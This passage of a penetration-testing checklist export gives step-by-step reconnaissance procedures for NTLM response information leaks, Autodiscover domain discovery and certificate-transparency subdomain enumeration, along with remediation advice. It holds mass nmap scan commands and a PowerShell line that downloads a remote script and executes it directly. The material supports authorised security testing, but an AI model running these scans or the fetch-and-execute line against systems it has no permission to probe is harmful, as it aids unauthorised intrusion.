used:</p><p><strong>Metasploit</strong></p><p>https://www.rapid7.com/db/modules/auxiliary/scanner/http/ntlm_info_enumeration</p><p>https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login</p><p><strong>Nmap</strong></p><p>https://github.com/GDSSecurity/Nmap-Scripts/tree/master/NTLM-Info-Disclosure</p><p>https://nmap.org/nsedoc/scripts/http-ntlm-info.html</p><p>https://nmap.org/nsedoc/scripts/imap-ntlm-info.html</p><pre><code>nmap -p443,80 --script http-ntlm-info -iL hosts\nnmap -v -Pn -sS -p443 -script http-ntlm-info -script-args http-ntlm-info.root=/abs/ dialin.contoso.com</code></pre><p><strong>NetSPI</strong></p><p>https://github.com/NetSPI/NTLMHTTPparser</p><h2><strong>Reporting Requirements</strong></h2><p>Please include the tool output or a list of enumerated Active Directory domains in the task details/notes.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063468,
							"uid": "d6a58004-6549-e811-8101-ecf4bbd04073",
							"name": "Information Disclosure - NTLM Response - Domain Information",
							"description": "<p>The remote service supports NTLM authentication. By sending an authentication request to the server and parsing the response it is possible to recover the hostname and the Active Directory domain name of the remote server. Additionally, if the affected service is available from the internet, it may allow threat actors to perform password guessing attacks without having to provide a multi-factor authentication (MFA) token.</p>",
							"severityId": 1,
							"businessImpact": "<p>The information recovered by parsing the NTLM authentication response from the server could be used in other attacks that lead to unauthorized system, application, and data access.</p>",
							"sourceIdentifier": "M:4e6074fa-3bde-46ce-a658-491aee041aaf",
							"verificationInstructions": "<h2><strong>Instructions</strong></h2><p>1. Identify interfaces that support NTLM.</p><p>2. Send authenticated request.</p><p>3. Parse information from the response.</p><p>4. If its possible to leak information, add the associated finding, and add verification that has the command and output.</p><h2></h2><h2><strong>For Autodiscover:</strong></h2><p> Identify internal, managed, and federated active directory domains.</p><p>The Autodiscover service minimizes user configuration and deployment steps by providing clients access to Exchange features. For Exchange Web Services (EWS) clients, Autodiscover is typically used to find the EWS endpoint URL. However, Autodiscover can also provide information to configure clients that use other protocols. Autodiscover works for client applications that are inside or outside firewalls and in resource forest and multiple forest scenarios.</p><p>As part of this service, an RPC over HTTP (\"Outlook Anywhere\") feature can be configured, resulting in the presence of the https://autodiscover.domain.com/rpc URL.  RPC over HTTP, also known as Outlook Anywhere, is a legacy method of connectivity and transport between Outlook for Windows and Exchange. In May 2014, Microsoft introduced MAPI over HTTP as a replacement for RPC over HTTP. </p><p>Starting on October 31, 2017, RPC over HTTP will no longer be a supported protocol for accessing mail data from Exchange Online. However, organizations may still support this feature depending on their Exchange configuration.</p><h3>Variation: Manual Process using Burp</h3><p>1. Start Burp and proxy your browser traffic through it.</p><p>2. For each domain enumerated in scope attempt to access the autodiscover subdomain's RPC URL to identify potential Active Directory domains.</p><p><em>Example:</em>https://autodiscover.domain.com/rpc</p><p>3. When prompted for credentials by the website, enter any username/password combination (invalid credentials are fine).</p><p>4. Copy the value (bolded portion below) from the WWW-Authenticate header that is returned by the server.</p><p><em>Example:</em></p><pre><code>WWW-Authenticate: NTLM <strong>TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=</strong></code></pre><p>5. Base64-decode the value and review it for internal domain names. Note that not all characters will be printable:</p><pre><code><em>Example:\n</em><strong># echo \"TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=\" | base64 -d</strong>\nNTLMSSP8\n98AMSAMSW0095AP20\"<strong>subdomain.domain.com</strong>6W0095AP20.subdomain.domain.comdomain.com</code></pre><h2><strong>For specific URLs use:</strong></h2><p>Tool: NTLM Challengers</p><p>Source: https://github.com/nopfor/ntlm_challenger</p><p>Example</p><pre><code><strong>python3 ntlm_challenger.py 'https://autodiscover.hackin.club/autodiscover/autodiscover.xml'\n\n</strong><span style=\"color: rgb(219, 39, 25)\"><strong>Target (Domain): HACKIN\n \nVersion: Server 2012 / Windows 8 (build 9200)\n\nTargetInfo:\n        MsvAvNbDomainName: HACKIN\n        MsvAvNbComputerName: EXCH01\n        MsvAvDnsDomainName: hackin.club\n        MsvAvDnsComputerName: EXCH01.hackin.club\n        MsvAvDnsTreeName: hackin.club\n        MsvAvTimestamp: Nov 3, 2019 01:07:16.573170\n \nNegotiate Flags:\n        NTLMSSP_NEGOTIATE_UNICODE\n        NTLMSSP_REQUEST_TARGET\n        NTLMSSP_NEGOTIATE_ALWAYS_SIGN\n        NTLMSSP_TARGET_TYPE_DOMAIN\n        NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY\n        NTLMSSP_NEGOTIATE_TARGET_INFO\n        NTLMSSP_NEGOTIATE_VERSION</strong></span></code></pre><h2><strong>For direct protocol access check use:</strong></h2><p>Tool: Nmap</p><p>Run the following nmap scripts to identify domain information:</p><p>Note: Grab targets from informational findings based on the protocol.</p><p>For example make sure to target all web servers listed under the finding \"HTTP - Service Uses Protocol\".</p><pre><code>nmap -p80,443 --script http-ntlm-info -iL hosts -oA nmap-NTLM-HTTP\nnmap -p1433 --script ms-sql-ntlm-info -iL hosts -oA nmap-NTLM-SQL\nnmap -p143,993 --script imap-ntlm-info -iL hosts -oA nmap-IMAP-NTLM\nnmap -p119,433,563 --script nntp-ntlm-info -iL hosts -oA nmap-NNTP-NTLM\nnmap -p110,995 --script pop3-ntlm-info -iL hosts -oA nmap-POP3-NTLM\nnmap -p25,465,587 --script smtp-ntlm-info -iL hosts -oA nmap-SMTP-NTLM\nnmap -p23 --script telnet-ntlm-info -iL hosts -oA nmap-TELNET-NTLM\nnmap -p3389 --script rdp-ntlm-info -iL hosts -oA nmap-RDP-NTLM\nnmap -p445 --script smb-os-discovery -iL hosts -oA nmap-SMB-NTLM</code></pre><p>AIO:</p><pre><code>nmap -p80,443 --script http-ntlm-info -iL hosts -oA nmap-NTLM-HTTP &amp;&amp; nmap -p1433 --script ms-sql-ntlm-info -iL hosts -oA nmap-NTLM-SQL &amp;&amp; nmap -p143,993 --script imap-ntlm-info -iL hosts -oA nmap-IMAP-NTLM &amp;&amp; nmap -p119,433,563 --script nntp-ntlm-info -iL hosts -oA nmap-NNTP-NTLM &amp;&amp; nmap -p110,995 --script pop3-ntlm-info -iL hosts -oA nmap-POP3-NTLM &amp;&amp; nmap -p25,465,587 --script smtp-ntlm-info -iL hosts -oA nmap-SMTP-NTLM &amp;&amp; nmap -p23 --script telnet-ntlm-info -iL hosts -oA nmap-TELNET-NTLM &amp;&amp; nmap -p3389 --script rdp-ntlm-info -iL hosts -oA nmap-RDP-NTLM &amp;&amp; nmap -p445 --script smb-os-discovery -iL hosts -oA nmap-SMB-NTLM</code></pre><h2><strong>RDP (Only in restricted Admin mode)</strong></h2><p>Below are some common tools that can be used:</p><p><strong>Metasploit</strong></p><p>https://www.rapid7.com/db/modules/auxiliary/scanner/http/ntlm_info_enumeration</p><p>https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login </p><p><strong>Nmap</strong></p><p>https://github.com/GDSSecurity/Nmap-Scripts/tree/master/NTLM-Info-Disclosure</p><p>https://nmap.org/nsedoc/scripts/http-ntlm-info.html</p><p>https://nmap.org/nsedoc/scripts/imap-ntlm-info.html</p><p>nmap -p443,80 --script http-ntlm-info -iL hosts</p><p>nmap -v -Pn -sS -p443 -script http-ntlm-info -script-args http-ntlm-info.root=/abs/ dialin.contoso.com</p><p>NetSPI</p><p>https://github.com/NetSPI/NTLMHTTPparser</p><p><strong>Reporting Requirements</strong></p><p>Please include the tool output or a list of enumerated Active Directory domains in the task details/notes.</p>",
							"references": "<ul><li>https://tools.ietf.org/html/rfc2617</li><li>https://docs.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>If NTLM authentication is not required for a defined business purpose it should be disabled on the service. If it is required, consider using an alternative method for authentication so internal host and Active Directory domain information cannot be leaked to unauthenticated users.</p>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "661f4f09-f11b-45c5-a80a-19475f1d76c1",
						"name": "Information Disclosure - ADS Domain - Autodiscover Service",
						"instructions": "<h2>Instructions</h2><p>Identify internal, managed, and federated active directory domains.</p><p>The Autodiscover service minimizes user configuration and deployment steps by providing clients access to Exchange features. For Exchange Web Services (EWS) clients, Autodiscover is typically used to find the EWS endpoint URL. However, Autodiscover can also provide information to configure clients that use other protocols. Autodiscover works for client applications that are inside or outside firewalls and in resource forest and multiple forest scenarios.</p><p>As part of this service, an RPC over HTTP (&quot;Outlook Anywhere&quot;) feature can be configured, resulting in the presence of the https://autodiscover.domain.com/rpc URL.  RPC over HTTP, also known as Outlook Anywhere, is a legacy method of connectivity and transport between Outlook for Windows and Exchange. In May 2014, Microsoft introduced MAPI over HTTP as a replacement for RPC over HTTP. </p><p>Starting on October 31, 2017, RPC over HTTP will no longer be a supported protocol for accessing mail data from Exchange Online. However, organizations may still support this feature depending on their Exchange configuration.</p><h2>Variation: Manual Process using Burp</h2><p>1. Start Burp and proxy your browser traffic through it.</p><p>2. For each domain enumerated in scope attempt to access the autodiscover subdomain's RPC URL to identify potential Active Directory domains.</p><h3>Example:</h3><pre><code>https://autodiscover.domain.com/rpc</code></pre><p>3. When prompted for credentials by the website, enter any username/password combination (invalid credentials are fine).</p><p>4. Copy the value (bold portion below) from the WWW-Authenticate header that is returned by the server.</p><h3>Example:</h3><pre><code>WWW-Authenticate: NTLM <strong>TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=</strong></code></pre><p>5. Base64-decode the value and review it for internal domain names. Note that not all characters will be printable:</p><h3>Example:</h3><pre><code><strong>&#35; echo &quot;TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=&quot; | base64 -d</strong>\nNTLMSSP8\n98AMSAMSW0095AP20&quot;<strong><span style=\"color: #DB2719\">subdomain.domain.com</span></strong>6W0095AP20.subdomain.domain.comdomain.com</code></pre><h2><strong>Reporting Requirements</strong></h2><p>Report the ADS domains in the task notes.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063468,
							"uid": "d6a58004-6549-e811-8101-ecf4bbd04073",
							"name": "Information Disclosure - NTLM Response - Domain Information",
							"description": "<p>The remote service supports NTLM authentication. By sending an authentication request to the server and parsing the response it is possible to recover the hostname and the Active Directory domain name of the remote server. Additionally, if the affected service is available from the internet, it may allow threat actors to perform password guessing attacks without having to provide a multi-factor authentication (MFA) token.</p>",
							"severityId": 1,
							"businessImpact": "<p>The information recovered by parsing the NTLM authentication response from the server could be used in other attacks that lead to unauthorized system, application, and data access.</p>",
							"sourceIdentifier": "M:4e6074fa-3bde-46ce-a658-491aee041aaf",
							"verificationInstructions": "<h2><strong>Instructions</strong></h2><p>1. Identify interfaces that support NTLM.</p><p>2. Send authenticated request.</p><p>3. Parse information from the response.</p><p>4. If its possible to leak information, add the associated finding, and add verification that has the command and output.</p><h2></h2><h2><strong>For Autodiscover:</strong></h2><p> Identify internal, managed, and federated active directory domains.</p><p>The Autodiscover service minimizes user configuration and deployment steps by providing clients access to Exchange features. For Exchange Web Services (EWS) clients, Autodiscover is typically used to find the EWS endpoint URL. However, Autodiscover can also provide information to configure clients that use other protocols. Autodiscover works for client applications that are inside or outside firewalls and in resource forest and multiple forest scenarios.</p><p>As part of this service, an RPC over HTTP (\"Outlook Anywhere\") feature can be configured, resulting in the presence of the https://autodiscover.domain.com/rpc URL.  RPC over HTTP, also known as Outlook Anywhere, is a legacy method of connectivity and transport between Outlook for Windows and Exchange. In May 2014, Microsoft introduced MAPI over HTTP as a replacement for RPC over HTTP. </p><p>Starting on October 31, 2017, RPC over HTTP will no longer be a supported protocol for accessing mail data from Exchange Online. However, organizations may still support this feature depending on their Exchange configuration.</p><h3>Variation: Manual Process using Burp</h3><p>1. Start Burp and proxy your browser traffic through it.</p><p>2. For each domain enumerated in scope attempt to access the autodiscover subdomain's RPC URL to identify potential Active Directory domains.</p><p><em>Example:</em>https://autodiscover.domain.com/rpc</p><p>3. When prompted for credentials by the website, enter any username/password combination (invalid credentials are fine).</p><p>4. Copy the value (bolded portion below) from the WWW-Authenticate header that is returned by the server.</p><p><em>Example:</em></p><pre><code>WWW-Authenticate: NTLM <strong>TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=</strong></code></pre><p>5. Base64-decode the value and review it for internal domain names. Note that not all characters will be printable:</p><pre><code><em>Example:\n</em><strong># echo \"TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=\" | base64 -d</strong>\nNTLMSSP8\n98AMSAMSW0095AP20\"<strong>subdomain.domain.com</strong>6W0095AP20.subdomain.domain.comdomain.com</code></pre><h2><strong>For specific URLs use:</strong></h2><p>Tool: NTLM Challengers</p><p>Source: https://github.com/nopfor/ntlm_challenger</p><p>Example</p><pre><code><strong>python3 ntlm_challenger.py 'https://autodiscover.hackin.club/autodiscover/autodiscover.xml'\n\n</strong><span style=\"color: rgb(219, 39, 25)\"><strong>Target (Domain): HACKIN\n \nVersion: Server 2012 / Windows 8 (build 9200)\n\nTargetInfo:\n        MsvAvNbDomainName: HACKIN\n        MsvAvNbComputerName: EXCH01\n        MsvAvDnsDomainName: hackin.club\n        MsvAvDnsComputerName: EXCH01.hackin.club\n        MsvAvDnsTreeName: hackin.club\n        MsvAvTimestamp: Nov 3, 2019 01:07:16.573170\n \nNegotiate Flags:\n        NTLMSSP_NEGOTIATE_UNICODE\n        NTLMSSP_REQUEST_TARGET\n        NTLMSSP_NEGOTIATE_ALWAYS_SIGN\n        NTLMSSP_TARGET_TYPE_DOMAIN\n        NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY\n        NTLMSSP_NEGOTIATE_TARGET_INFO\n        NTLMSSP_NEGOTIATE_VERSION</strong></span></code></pre><h2><strong>For direct protocol access check use:</strong></h2><p>Tool: Nmap</p><p>Run the following nmap scripts to identify domain information:</p><p>Note: Grab targets from informational findings based on the protocol.</p><p>For example make sure to target all web servers listed under the finding \"HTTP - Service Uses Protocol\".</p><pre><code>nmap -p80,443 --script http-ntlm-info -iL hosts -oA nmap-NTLM-HTTP\nnmap -p1433 --script ms-sql-ntlm-info -iL hosts -oA nmap-NTLM-SQL\nnmap -p143,993 --script imap-ntlm-info -iL hosts -oA nmap-IMAP-NTLM\nnmap -p119,433,563 --script nntp-ntlm-info -iL hosts -oA nmap-NNTP-NTLM\nnmap -p110,995 --script pop3-ntlm-info -iL hosts -oA nmap-POP3-NTLM\nnmap -p25,465,587 --script smtp-ntlm-info -iL hosts -oA nmap-SMTP-NTLM\nnmap -p23 --script telnet-ntlm-info -iL hosts -oA nmap-TELNET-NTLM\nnmap -p3389 --script rdp-ntlm-info -iL hosts -oA nmap-RDP-NTLM\nnmap -p445 --script smb-os-discovery -iL hosts -oA nmap-SMB-NTLM</code></pre><p>AIO:</p><pre><code>nmap -p80,443 --script http-ntlm-info -iL hosts -oA nmap-NTLM-HTTP &amp;&amp; nmap -p1433 --script ms-sql-ntlm-info -iL hosts -oA nmap-NTLM-SQL &amp;&amp; nmap -p143,993 --script imap-ntlm-info -iL hosts -oA nmap-IMAP-NTLM &amp;&amp; nmap -p119,433,563 --script nntp-ntlm-info -iL hosts -oA nmap-NNTP-NTLM &amp;&amp; nmap -p110,995 --script pop3-ntlm-info -iL hosts -oA nmap-POP3-NTLM &amp;&amp; nmap -p25,465,587 --script smtp-ntlm-info -iL hosts -oA nmap-SMTP-NTLM &amp;&amp; nmap -p23 --script telnet-ntlm-info -iL hosts -oA nmap-TELNET-NTLM &amp;&amp; nmap -p3389 --script rdp-ntlm-info -iL hosts -oA nmap-RDP-NTLM &amp;&amp; nmap -p445 --script smb-os-discovery -iL hosts -oA nmap-SMB-NTLM</code></pre><h2><strong>RDP (Only in restricted Admin mode)</strong></h2><p>Below are some common tools that can be used:</p><p><strong>Metasploit</strong></p><p>https://www.rapid7.com/db/modules/auxiliary/scanner/http/ntlm_info_enumeration</p><p>https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login </p><p><strong>Nmap</strong></p><p>https://github.com/GDSSecurity/Nmap-Scripts/tree/master/NTLM-Info-Disclosure</p><p>https://nmap.org/nsedoc/scripts/http-ntlm-info.html</p><p>https://nmap.org/nsedoc/scripts/imap-ntlm-info.html</p><p>nmap -p443,80 --script http-ntlm-info -iL hosts</p><p>nmap -v -Pn -sS -p443 -script http-ntlm-info -script-args http-ntlm-info.root=/abs/ dialin.contoso.com</p><p>NetSPI</p><p>https://github.com/NetSPI/NTLMHTTPparser</p><p><strong>Reporting Requirements</strong></p><p>Please include the tool output or a list of enumerated Active Directory domains in the task details/notes.</p>",
							"references": "<ul><li>https://tools.ietf.org/html/rfc2617</li><li>https://docs.microsoft.com/en-us/dotnet/framework/wcf/feature-details/understanding-http-authentication</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>If NTLM authentication is not required for a defined business purpose it should be disabled on the service. If it is required, consider using an alternative method for authentication so internal host and Active Directory domain information cannot be leaked to unauthenticated users.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "b4a61438-93b0-48da-a5e9-078bf57c1a6b",
						"name": "Information Disclosure - ADS Domain - Certificate Information",
						"instructions": "<h2>Instructions</h2><p>Review crt.sh and scraped SSL certificate host names for potential Active Directory domain names.</p><p><strong>Note:</strong> Start the review with self-signed certs.</p><h2><strong>Variation: Automation with Invoke-CTFR-Lookup2</strong></h2><p>1. Download and load https://github.com/NetSPI/PowerShell-Private-Old/blob/main/Invoke-CTFR-Lookup2.psm1</p><p>2. Run the domain collection and use the -ShowAdDomains flag.</p><pre><code>PS C:&gt; <strong>$Results = Invoke-CTFR-Lookup2 -Verbose -ShowAdDomains -domain &quot;acme.com&quot; -ADOutputFile c:\\temp\\domains.txt</strong>\n\nVERBOSE: Imported 1 domain/keyword targets from command line.\nVERBOSE: Targeting 1 unique domains/keywords.\nVERBOSE: acme.com\nVERBOSE:  - Pulling records from crt.sh\nVERBOSE:  - Cleaning data\nVERBOSE:  - Processing sub domains\nVERBOSE: Checking for potential Active Directory domains.\nVERBOSE: 19 potential Active Directory domains were found.\nVERBOSE: - api.open.acme.com\nVERBOSE: - corp.acme.com\nVERBOSE: - dts.acme.com\nVERBOSE: - eprocurement.acme.com\nVERBOSE: - fhirpoint.open.acme.com\nVERBOSE: - fhirpointdev.open.acme.com\nVERBOSE: - fhirpointstage.open.acme.com\nVERBOSE: - fhirpointtest.open.acme.com\nVERBOSE: - inside.acme.com\nVERBOSE: - insidetest.acme.com\nVERBOSE: - intranet.acme.com\nVERBOSE: - mobility.acme.com\nVERBOSE: - open.acme.com\nVERBOSE: - rd.acme.com\nVERBOSE: - sandbox.open.acme.com\nVERBOSE: - intranet.open.acme.com\nVERBOSE: - im.acme.com\nVERBOSE: - copr.acme.com\nVERBOSE: - corp.acme.com\nVERBOSE: 389 domains found.\nVERBOSE: All done.\n\nPS C:&gt;<strong> gc c:\\temp\\domain.txt</strong>\n\napi.open.acme.com\ncorp.acme.com\ndts.acme.com\neprocurement.acme.com\nfhirpoint.open.acme.com\nfhirpointdev.open.acme.com\nfhirpointstage.open.acme.com\nfhirpointtest.open.acme.com\ninside.acme.com\ninsidetest.acme.com\nintranet.acme.com\nmobility.acme.com\nopen.acme.com\nrd.acme.com\nsandbox.open.acme.com\nintranet.open.acme.com\nim.acme.com\ncopr.acme.com\ncorp.acme.com</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064791,
							"uid": "9232a3a9-863f-e911-810e-ecf4bbd04083",
							"name": "General Information - Domains - SSL Certificate Transparency Logs",
							"description": "<p>It was possible to recover potentially non-public information from an SSL certificate associated with an in-scope domain via SSL certificate transparency logs.</p>",
							"severityId": -2,
							"businessImpact": "<p>Non-public information (Internal Hostnames, Emal Addresses, etc.) gathered from SSL certifcates could potentially be used in future attacks.</p>",
							"sourceIdentifier": "M:f5507095-5d77-4ced-9b7a-fba95fa3c0b1",
							"verificationInstructions": "<h2>Background Information</h2><p>Certificate Transparency (CT) is an open framework of logs, monitors, and auditors created to help domain owners oversee digital certificates issued for their brands. CT logs help domain owners protect their brand by providing a way to find accidentally issued or rogue certificates more easily. Certificate-issuing entities, like certificate authorities (CAs), log certificates to comply with standards.</p><p>The end goal of CT is twofold. First, CAs log all TLS/SSL Certificates in multiple, publicly available CT logs run by independent companies, allowing browsers to provide trust only to certificates that have been logged. Second, domain owners and interested parties can monitor these CT logs to detect certificates that were either accidentally issued by the CA or not actually authorized by the organization.</p><p><a href='https://crt.sh'>https://crt.sh</a> is one of the foundational web tools for monitoring CT logs, which capture information about the SSL certificates that have been issued by CAs. This site can serve as a data source to obtain a list of subdomains for a target domain, internal hostnames, or other non-public information.</p><h2>Instructions</h2><p><strong>Note: </strong>This task is already executed during the <strong>SubDomains - subfinder</strong> ExPen checklist task, so it does not need to be explicitly run. It is here for reference only in the event that it needs to be run independently for any reason.</p><p>1. Execute the recommended variation shown below to query the certificate transparency logs hosted at <a href='https://crt.sh'>https://crt.sh</a> for certificates tied to the targeted primary domains.</p><p>2. Review SSL certificate information from the certificate transparency logs for subdomains, internal hostnames, potential Active Directory domain names, and other information that might be considered non-public.</p><h2>Variation: subfinder (Recommended)</h2><h3>Install</h3><pre><code>$ go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</code></pre><p>Alternatively, the latest binaries can be downloaded from the GitHub repository at <a href='https://github.com/projectdiscovery/subfinder/releases'>https://github.com/projectdiscovery/subfinder/releases</a></p><h3>Execution Example</h3><p><strong>Single Domain Target:</strong></p><pre><code><strong>$ subfinder -silent -s crtsh -d netspi.com | sort -u</strong>\nal.netspi.com\nasm-backchannel.netspi.com\nasm-dev.netspi.com\nasm-login.netspi.com\nasm.netspi.com\nattacksim-aws.netspi.com\n<strong>[TRUNCATED]</strong></code></pre><p><strong>File with List of Target Domains:</strong></p><pre><code><strong>$ subfinder -silent -s crtsh -dL primary-domains.txt | sort -u</strong>\nal.netspi.com\nasm-backchannel.netspi.com\nasm-dev.netspi.com\nasm-login.netspi.com\nasm.netspi.com\nattacksim-aws.netspi.com\n<strong>[TRUNCATED]</strong></code></pre><h2>Variation: Get-SSLCertInfo-CTFR</h2><h3>Download</h3><pre><code>PS C:&gt; iex(new-object system.net.webclient).downloadstring(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Get-SSLCertInfo-CTFR.psm1&quot;)</code></pre><h3>Execution Example</h3><p><strong>Note: </strong>In addition to running against a single domain, the script supports an input file that contains a list of domains. Other flags and output formats are available. Please refer to <a href='https://github.com/NetSPI/PowerShell/blob/master/Get-SSLCertInfo-CTFR.psm1'>https://github.com/NetSPI/PowerShell/blob/master/Get-SSLCertInfo-CTFR.psm1</a> for additional usage.</p><pre><code>PS C:&gt; <strong>$results = Get-SSLCertInfo-CTFR -ShowAdDomains  -domain &quot;netspi.com&quot; -domainList C:\\temp\\domains.txt</strong>\nPS C:\\&gt; <strong>$results | Format-List -Property CertDomain</strong>\n\nCertDomain :\n\nCertDomain : <strong><span style=\"color: #DB2719\">owapps.netspi.com</span></strong>\n\nCertDomain : <strong><span style=\"color: #DB2719\">passwords.netspi.com</span></strong>\n\nCertDomain : <strong><span style=\"color: #DB2719\">passwords.netspi.com\n</span></strong><strong><span style=\"color: #DB2719\">             www.passwords.netspi.com</span></strong>\n\nCertDomain : <strong><span style=\"color: #DB2719\">pentestfw.netspi.com\n</span></strong><strong>[TRUNCATED]</strong></code></pre><h2>Variation: Invoke-CTFR-Lookup2.psm1</h2><h3>Download</h3><pre><code>https://github.com/NetSPI/PowerShell-Private-Old/blob/main/Invoke-CTFR-Lookup2.psm1</code></pre><h3>Execution Example</h3><pre><code>PS C:\\&gt; <strong>Import-Module .\\Invoke-CTFR-Lookup2.psm1</strong>\nPS C:\\&gt; <strong>$Results = Invoke-CTFR-Lookup2 -Verbose -ShowAdDomains  -domain &quot;netspi.com&quot; -ADOutputFile c:\\temp\\domains.txt</strong>\nVERBOSE: Imported 1 domain/keyword targets from command line.\nVERBOSE: Targeting 1 unique domains/keywords.\nVERBOSE: netspi.com\nVERBOSE:  - Pulling records from crt.sh\nVERBOSE:  - Cleaning data\nVERBOSE:  - Processing sub domains\nVERBOSE: Checking for potential Active Directory domains.\nVERBOSE: 55 potential Active Directory domains were found.\nVERBOSE: - netspi.com\nnetspi.com\nVERBOSE: - netspi.com\nnetspi.com\nowapps.netspi.com\n<strong>[TRUNCATED]</strong>\nsqlwiki.netspi.com\nVERBOSE: - asm.netspi.com\nVERBOSE: 172 domains found.\nVERBOSE: All done.\n\nPS C:\\&gt; <strong>gc C:\\temp\\domains.txt\n</strong><strong><span style=\"color: #DB2719\">asm.netspi.com\n</span></strong><strong><span style=\"color: #DB2719\">bas.netspi.com\n</span></strong><strong><span style=\"color: #DB2719\">blogs.netspi.com\n</span></strong><strong>[TRUNCATED]</strong></code></pre><h2>Variation: Manual Review</h2><p>1. Enter the company name or the targeted primary domain name into the search box at <a href='https://crt.sh'>https://crt.sh</a>.</p><p>2. Review the &quot;Matching Identities&quot; column to pull out the associated subdomains, internal hostnames, or non-public information that you're interested in. You can select the entire table with your mouse and then copy it into Excel reasonably well in order to pull the data from the &quot;Matching Identities&quot; column fairly easily.</p><h2>Reporting Requirements</h2><p>1. Provide a comment in the checklist item that shows the command(s) run to obtain the resulting data. If the output from the commands is a reasonable size, it can also be included in the checklist comment. If it's too large, it can be omitted.</p><p>2. Collect the subdomains from the tool output and add them to a Subdomains sheet in the master spreadsheet being maintained for the project. Create a new column in the sheet called CTFR and collect the enumerated subdomains there.</p><p>3. Ultimately, this spreadsheet will get uploaded to the Artifacts folder after the project is completed.</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that SSL certificates used by internal servers are issued by an internal certificate authority and not an external certificate authority.  Additionally, do not specify internal systems or domains in the SAN field for the certificate.</p><p>If the SSL certificate is being used for external-facing infrastructure, split the certificate to cover a single domain only, such that additional domains are not exposed to the requestor. If this is not possible, consider using wildcard domains in certificate to mask exact domain names from requestors.</p><p>Corrective actions may not be required, but it is important to be aware that data from Certificate Transparency Logs can be viewed and leveraged by attackers. </p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
